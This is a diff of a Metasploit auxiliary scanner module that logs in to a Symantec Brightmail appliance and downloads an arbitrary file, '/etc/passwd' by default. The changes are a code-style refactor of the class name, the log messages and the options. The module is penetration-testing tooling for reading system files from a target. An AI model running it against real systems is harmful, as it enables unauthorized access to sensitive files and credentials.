@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
@@ -44,9 +41,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),
         OptString.new('USERNAME', [true, 'The username to login as']),
         OptString.new('PASSWORD', [true, 'The password to login with'])
-      ], self.class)
-
-    deregister_options('RHOST')
+      ])
   end
 
   def auth(username, password, sid, last_login)
@@ -111,40 +106,39 @@ class Metasploit3 < Msf::Auxiliary
     })
 
     if not res
-      print_error("#{peer} - Unable to download the file. The server timed out.")
+      print_error("Unable to download the file. The server timed out.")
       return
     elsif res and res.body.empty?
-      print_error("#{peer} - File not found or empty.")
+      print_error("File not found or empty.")
       return
     end
 
-    vprint_line("")
+    vprint_line
     vprint_line(res.body)
 
     f = ::File.basename(fname)
     p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)
-    print_good("#{peer} - File saved as: '#{p}'")
+    print_good("File saved as: '#{p}'")
   end
 
 
   def run_host(ip)
     sid, last_login = get_login_data
     if sid.empty? or last_login.empty?
-      print_error("#{peer} - Missing required login data.  Cannot continue.")
+      print_error("Missing required login data.  Cannot continue.")
       return
     end
 
     username = datastore['USERNAME']
     password = datastore['PASSWORD']
     if not auth(username, password, sid, last_login)
-      print_error("#{peer} - Unable to login.  Cannot continue.")
+      print_error("Unable to login.  Cannot continue.")
       return
     else
-      print_good("#{peer} - Logged in as '#{username}:#{password}'")
+      print_good("Logged in as '#{username}:#{password}'")
     end
 
     fname = datastore['FILENAME']
     download_file(sid, fname)
   end
-
 end
